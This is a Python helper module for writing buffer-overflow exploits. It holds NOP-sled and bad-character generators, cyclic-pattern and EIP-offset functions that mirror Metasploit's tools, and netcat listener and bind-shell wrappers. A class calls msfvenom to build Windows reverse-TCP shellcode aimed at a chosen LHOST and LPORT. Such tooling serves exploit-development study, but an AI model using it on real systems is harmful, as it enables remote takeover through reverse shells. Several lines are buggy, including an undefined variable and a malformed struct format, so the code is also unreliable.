#!/usr/bin/env python3
import socket, time, re
import struct, os, struct,subprocess


nop_sled_16 = "\x90"*16         # 16 byte NOP sled if needed
sub_esp_10= "\x83\xec\x10"      # sub esp,0x10 (drop esp back to 16 bytes)

# These are useful methods for testing purposes while develop an exploit
def encode(string):
    return string.encode(encoding='latin-1')    # Encoding the given string to Latin-1 type byze array
def decode(bytearr):
    return bytearr.decode(encoding='latin-1')   # Decoding the given byte array to Latin-1 encoded string 
def generate_chars(badchars=['0x00'],create_bin=False):
    """
    This function will generate character array for bad char identification.
    """
    
    bctest = ""     # the returnes string
    for i in range(0x00,0xFF+1):       # python range 0 - 255 (+1 is need for 255)
        if i not in badchars:
            bctest += chr(i)            # Add character to string ii it is not a known bad char
      
      
    if create_bin:
        # Write the output into a file        
        with open('bctest.bin','wb') as f:  
            f.write(encode(bctest))         # write the result into a binary (required for mona)
            
    return bctest                       # return the resulted string
def generate_pattern(plength):
    """
    This function will generate unique cyclic string for EIP identification.
    The result is the same of msf-pattern_create. The result works with msf-pattern_offset.
    """
    
    pattern = ""        # The result pattern string
    i = 0               # counter for numbers
    j = 0               # counter for lower alphabet
    k = 0               # counter for Uppel Letters
    while len(pattern)<plength:
        pattern += _get_next_pattern_string(i,j,k)  # Generate the next pattern element
        i += 1
        if i == 10:
            i = 0
            j += 1
            if j == 26:
                j= 0
                k+=1
    if len(pattern)>plength:
        pattern = pattern[:plength] # Split the pattern to the correct size
        return pattern          # return pattern
    elif len(pattern)==plength:
        return pattern

def _get_next_pattern_string(i,j,k):
    alphabet = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'] # alphabet
    return alphabet[k].upper()+alphabet[j]+str(i)   # generate pattern element from the given parameters, and return it.


def _format_int(integer):
    return "\\x{:02x}".format(integer)
def get_pattern_offset(length, EIP):
    """
    This modul will determine the offset of the given EPI stored value.
    The function is fully compatible with msf-pattern_create. The functionality is similar to msf-pattern_offset
    """
    
    ba = bytearray.fromhex(EIP) # create a byte array from EIP stored HEX code
    ba.reverse()                # reverse if because Little Endian
    eip = ba.decode(encoding='latin-1') # Get the result string from decode
    pattern = generate_pattern(length)  # generate a given length of pattern
    a = pattern.find(eip)               # find the given EIP value in the generated pattern
    if a > 0:
        print(f"Offset found near: {str(a)}")
    else:
        print(f"No Sequence found: {eip} ({EIP})")
    return a
    
    
def generate_nop_sled(length):
    if length > 0:
        return '\x90'*length    # generate a spaecified length NOP sled
    else:
        return ''




def spawn_rev_shell(port):
    os.system(f'nc -lnvp {str(port)}')
def connect_bind_shell(address,port,timeout=3):
    time.sleep(timeout)
    os.system(f'nc {address} {str(port)}')
def get_address_space(start_address, end_address):
    space = end_address - start_address
    return space
def get_pattern_space(pstart, pend,length=6000):
    ps = bytearray.fromhex(pstart)
    pe = bytearray.fromhex(pend)
    ps.reverse()
    pe.reverse()
    psaddr = ps.decode(encoding='latin-1')
    peaddr = pe.decode(encoding='latin-1')
    pattern = generate_pattern(length)  
    psp = pattern.find(psaddr)
    pep = pattern.find(peaddr)
    if psp > 0 and pep > 0:
        space = pep - psp
        print(f"The pattern space is: {str(space)}")
    else:
        if psp < 0:
            print(f"The address of {pstart} is lower than 0.")
        if pep < 0:
            print(f"The address of {petart} is lower than 0.")
def pack_little_endian(address):
    return struct.pack('<I',address)
def pack_big_endian(address):
    return struct.pack('I>',address)
def pack(t,address):
    return decode(struct.pack(t,address))



# Start of Class
class msf_shellcode:

    def run_msfvenom_command(self,command):
        if not command.startswith('msfvenom'):
            command = "msfvenom "+command
        cmd = command.split(' ')
        result = subprocess.run(cmd,text=True,capture_output=True)
        pattern = r'(\\x[0-9a-fA-F]{2})'
        match = re.findall(pattern,result.stdout,re.I|re.M)
        shellcode = ""
        for m in match: shellcode += m.replace('\\x','')
        ba = bytearray.fromhex(shellcode)
        
        return ba.decode(encoding='latin-1')
    def generate_popcalc(self,exitfunc="thread",badchars=""):
        shellcode = self.run_msfvenom_command(f"-p windows/exec CMD=calc.exe EXITFUNC={exitfunc} -b '{badchars}' -f python")
        return shellcode
    def generate_ncrev_shell(self,exitfunc="thread",badchars="",lhost="",lport=""):
        return self.run_msfvenom_command(f"-p windows/shell_reverse_tcp EXITFUNC={exitfunc} -b '{badchars}' -f python LHOST={lhost} LPORT={lport}")
              
              
              
